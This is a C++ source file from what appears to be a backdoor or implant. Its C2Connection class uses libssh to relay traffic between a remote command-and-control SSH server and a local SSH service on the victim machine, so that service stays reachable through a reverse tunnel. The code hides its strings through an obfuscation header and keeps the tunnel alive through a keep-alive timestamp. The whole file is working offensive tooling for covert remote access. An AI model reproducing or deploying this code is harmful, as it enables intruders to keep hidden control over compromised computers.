#include "C2Connection.h"
#include "obfuscated_strings.h"

#ifdef _WIN32
#	include <Lmcons.h>
#	include <Ws2tcpip.h>
#	define close closesocket
#	define poll WSAPoll
#else
#	define UNLEN 256
#	include <arpa/inet.h>
#	include <poll.h>
#	include <pwd.h>
#	include <string.h>
#endif // _WIN32

#include <thread>

#define CLIENT_SENT_EOF -6
#define SERVICE_SENT_EOF -5
#define SERVICE_CONN_ERROR -4
#define SSH_SENT_EOF -3
#define SYSTEM_ERROR -2

int C2Connection::connect_to_local_service(const unsigned int port)
{
    int sockfd = 0;

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, OBFUSCATED("127.0.0.1"), &serv_addr.sin_addr) <= 0)
    {
        debug("[C2Connection] inet_pton\n");
        return -1;
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        debug("[C2Connection] socket\n");
        return -1;
    }

    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0)
    {
        debug("[C2Connection] connect\n");
        return -1;
    }

    return sockfd;
}

int C2Connection::do_remote_forwarding_loop()
{
    int sockfd;
    int rc;
    char buffer[4096];

    debug("[C2Connection] Connecting to localhost:%d...\n", localSSHPort_);
    /* Connect to the service */
    sockfd = connect_to_local_service(localSSHPort_);
    if (sockfd == -1)
    {
        debug("[C2Connection] connect_to_local_service failed\n");
        return SERVICE_CONN_ERROR;
    }

    // Set not blocking
    //As far as I know this is not necessary.
    // We are using poll to know in advance if there is data to read,
    // so recv is not going to block because we only call it when there is data
    // #ifdef _WIN32
    //     u_long iMode = 1;
    //     ioctlsocket(sockfd, FIONBIO, &iMode);
    // #endif // _WIN32

    int nbytes = 0, nwritten = 0;

    struct pollfd fds[1];
    fds[0].fd = sockfd;
    fds[0].events = POLLIN;

    while (!*should_terminate_ && ssh_is_connected(session_))
    {
        //First we poll the local service socket, sockfd, for 100 millisecons
        rc = poll(fds, 1, 20);
        if (rc == -1)
        {
            close(sockfd);
            return SYSTEM_ERROR;
        }
        //If there is anything to read from the our local SSH server then read it and write it to the channel
        if (fds[0].revents & POLLIN)
        {
            nbytes = recv(sockfd, buffer, sizeof(buffer), 0);
            if (nbytes < 0)
            {
                if (errno != EAGAIN && errno != EWOULDBLOCK)
                {
                    close(sockfd);
                    return SERVICE_CONN_ERROR;
                }
            }
            else if (nbytes == 0)
            {
                debug("[C2Connection] recv: EOF\n");
                close(sockfd);
                return SERVICE_SENT_EOF;
            }
            debug("[C2Connection] Read %d bytes from service\n", nbytes);

            int tot_sent = 0;
            while (tot_sent < nbytes)
            {
                //debug("Before ssh_channel_write. tot_sent=%d nbytes=%d\n", tot_sent, nbytes);
                pthread_mutex_lock(mutex_);
                nwritten = ssh_channel_write(channel_, buffer + tot_sent, nbytes - tot_sent);
                pthread_mutex_unlock(mutex_);

                //debug("After ssh_channel_write, nwritten=%d\n", nwritten);
                if (nwritten == SSH_ERROR)
                {
                    debug("[C2Connection] ssh_channel_write: %s\n", ssh_get_error(session_));
                    close(sockfd);
                    return SSH_ERROR;
                }
                else
                {
                    tot_sent += nwritten;
                    debug("[C2Connection] Sent %d bytes to SSH tunnel\n", nwritten);
                }
            }
        }

        //Next, we poll the channel
        pthread_mutex_lock(mutex_);
        rc = ssh_channel_poll(channel_, 0);
        pthread_mutex_unlock(mutex_);

        /*  ClientAliveInterval setting on the C2 SSH server only sends keep alive messages when
            there is not an open channel so we should update last_keep_alive while there is an open channel
        */
        *last_keep_alive_ = std::chrono::system_clock::now();

        //debug("ssh_channel_poll rc=%d\n", rc);
        //If there is anything to read from the channel then read it and write it to the socket (our local SSH server)
        if (rc != 0 && rc != SSH_ERROR)
        {
            //nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer), 0);
            //debug("ssh_channel_read, sizeof(buffer) %d\n", sizeof(buffer));
            pthread_mutex_lock(mutex_);
            nbytes = ssh_channel_read(channel_, buffer, sizeof(buffer), 0);
            pthread_mutex_unlock(mutex_);

            if (nbytes == 0)
            {
                if (ssh_channel_is_eof(channel_) || !ssh_channel_is_open(channel_))
                {
                    close(sockfd);
                    return SSH_SENT_EOF;
                }
            }
            if (nbytes == SSH_ERROR)
            {
                debug("[C2Connection] ssh_channel_read: %s\n", ssh_get_error(session_));
                close(sockfd);
                return SSH_ERROR;
            }
            if (nbytes > 0)
            {
                debug("[C2Connection] Read %d bytes from SSH tunnel\n", nbytes);

                /* Write to service */
                int tot_sent = 0;
                while (tot_sent < nbytes)
                {
                    nwritten = send(sockfd, buffer + tot_sent, nbytes - tot_sent, 0);

                    if (nwritten < 0)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            close(sockfd);
                            return SERVICE_CONN_ERROR;
                        }
                    }
                    else
                    {
                        tot_sent += nwritten;
                        debug("[C2Connection] Sent %d bytes to service\n", nwritten);
                    }
                }
            }
        }
    }
    return SSH_OK;
}

void C2Connection::remote_forwading_thread()
{

    int rc = do_remote_forwarding_loop();

    if (rc == SSH_SENT_EOF || rc == SSH_ERROR || rc == SYSTEM_ERROR)
    {
        debug("[C2Connection] Terminate SSH channel\n");
    }
    else
    {
        /* The service has either sent EOF
           or an error condition occurred, but
           the tunnel is still open.
           Accept a new connection. */
        debug("[C2Connection] Service disconnected. rc = %d\n", rc);
    }

    ssh_channel_send_eof(channel_);
    ssh_channel_free(channel_);

    // Delete entry of this connection in map 
    pthread_mutex_lock(mutex_);
    active_connections_->erase(std::this_thread::get_id());
    pthread_mutex_unlock(mutex_);

    // Detele this object since the connection is gone
    delete this;
}